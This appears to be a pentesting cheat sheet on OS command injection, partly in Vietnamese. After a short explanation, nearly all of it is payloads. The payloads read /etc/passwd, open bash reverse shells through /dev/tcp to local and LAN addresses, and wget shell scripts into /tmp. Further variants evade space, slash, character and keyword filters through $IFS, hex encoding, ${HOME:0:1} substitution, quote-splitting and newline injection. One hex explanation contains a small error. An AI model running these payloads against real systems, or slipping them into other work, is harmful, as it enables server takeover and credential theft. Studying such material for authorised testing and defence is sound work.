# What is OS Command Injection?
OS Command Injection (also known as shell injection) is a vulnerability that allows an attacker to execute 
arbitrary operating system commands on a server running an application with the web server's privileges. 
The vulnerability occurs when an application invokes a shell command to execute a task with user input but 
does not filter it carefully.

The OS command injection vulnerability could allow an attacker to perform behaviors such as:

- Execute system commands.

- Damage the application, the server running the application, and the data on it.

- Implement SSRF.

- Remote Code Execution.

- ...

## Basic commands
Here I give 3 commonly used commands after detecting the test system affected by OS Command Injection

1. Read files on Server
 ```
cat /etc/passwd
```
2. Reverse Shell
```
bash -i >& /dev/tcp/127.0.0.1/8080 0>&1

```
3. Download reverse shell trên server
```
wget http://127.0.0.1:8080/x.sh -O /tmp/y.sh
```
## Bypass without space

> In case the server prevents OS Commnad Injection by validating "spaces". We perform bypass in the following ways:
1. Read files on Server
```bash
* cat</etc/passwd

* (cat,/etc/passwd)

* cat${IFS}/etc/passwd

* X=$'cat\x20/etc/passwd'&&$X

* bash</etc/passwd

* IFS=,;$(cat<<<cat,/etc/passwd) (Chỉ hoạt động trên Bash Shell)
```
2. Reverse Shell
```bash
* bash$IFS-i$IFS>&$IFS/dev/tcp/192.168.1.21/8080$IFS0>&1 

* echo${IFS}"RCE"${IFS}&&bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/8080$IFS0>&1

* sh</dev/tcp/127.0.0.1/8080

* IFS=,;`bash<<<bash,-i,>&/dev/tcp/127.0.0.1/8080;0>&1
```
3. Download reverse shell trên server
```bash
* {wget,http://127.0.0.1:8080/x.sh,-O,/tmp/y.sh}

* wget${IFS}http://127.0.0.1:8080/x.sh${IFS}-O${IFS}/tmp/y.sh

* X=$'wget\x20http://127.0.0.1:8080/x.sh\x20-O\x20/tmp/y.sh'&&$X

* IFS=,;$(cat<<<wget,http://127.0.0.1:8080/x.sh,-O,/tmp/y.sh)
```
## Bypass characters filter via hex encoding
1. Read files on Server
```bash
* cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

* cat $(xxd -r -p <<< 2f6574632f706173737764)

* cat $(xxd -r -ps <(echo 2f6574632f706173737764))
```
> (Where the value ```\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x66```corresponds to /etc/passwd after hex encoding)

2. Dowload reverse shell trên server
```bash
* $(xxd -r -p <<< 7767657420687474703a2f2f3132372e302e302e313a313231322f782e7368202d4f202f746d702f792e73680a)

* $(xxd -r -ps <(echo 7767657420687474703a2f2f3132372e302e302e313a313231322f782e7368202d4f202f746d702f792e73680a))

* $(echo -e "\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x31\x32\x2f\x78\x2e\x73\x68\x20\x2d\x4f\x20\x2f\x74\x6d\x70\x2f\x79\x2e\x73\x68\x0a")
```

> (Where the value 
```7767657420687474703a2f2f3132372e302e302e313a313231322f782e7368202d4f202f746d702f792e73680a```
corresponds to " wget http://127.0.0.1:1212/x.sh -O /tmp/y.sh " after hex encoding)

## Bypass without backslash and slash

> In case the server prevents OS Commnad Injection by validating the sign ```"/"```and the 
```"\".``` We perform bypass in the following ways:
1. Read files on Server
```bash
* cat ${HOME:0:1}etc${HOME:0:1}passwd

* cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
> (Where the value ${HOME:0:1} and (echo . | tr '!-0' '"-1') in place of / )

2.Reverse Shell
```bash
* bash -i >& ${HOME:0:1}dev${HOME:0:1}tcp${HOME:0:1}127.0.0.1${HOME:0:1}8080 0>&1

* bash -i >& $(echo . | tr '!-0' '"-1')dev$(echo . | tr '!-0' '"-1')tcp$(echo . | tr '!-0' '"-1')127.0.0.1$(echo . | tr '!-0' '"-1')8080 0>&1
```
3. Download files on the server
```bash
* wget http:${HOME:0:1}${HOME:0:1}127.0.0.1:8080${HOME:0:1}x.sh -O ${HOME:0:1}tmp${HOME:0:1}y.sh

* wget http:$(echo . | tr '!-0' '"-1')$(echo . | tr '!-0' '"-1')127.0.0.1:8080$(echo . | tr '!-0' '"-1')x.sh -O $(echo . | tr '!-0' '"-1')tmp$(echo . | tr '!-0' '"-1')y.sh
```
## Bypass Blacklisted words

> In case the server prevents OS Commnad Injection by not allowing the input of 
common commnads like "cat , more , bash , wget .." We perform the 
bypass in the following ways:

1. Read files on Server
```
* c'a't /etc/passwd

* c"a"t /etc/passwd

* c\a\t /etc/passwd

* ca$@t /etc/passwd

* /???/c?t /etc/passwd

* /???/c?t /?tc/?as?wd
```
2. Reverse Shell
```
* b'a'sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

* b"a"sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

* b\a\s\h -i >& /dev/tcp/127.0.0.1/8080 0>&1

* ba$@sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

* /???/b?sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
```
3. Download files on the server
```

* w'ge't http://127.0.0.1:8080/x.sh -O /tmp/y.sh

* w"ge"t http://127.0.0.1:8080/x.sh -O /tmp/y.sh

* /???/?i?/w?et http://127.0.0.1:8080/x.sh -O /tmp/y.sh
```
## Bypass with a line return
- something%0Acat%20/etc/passwd

























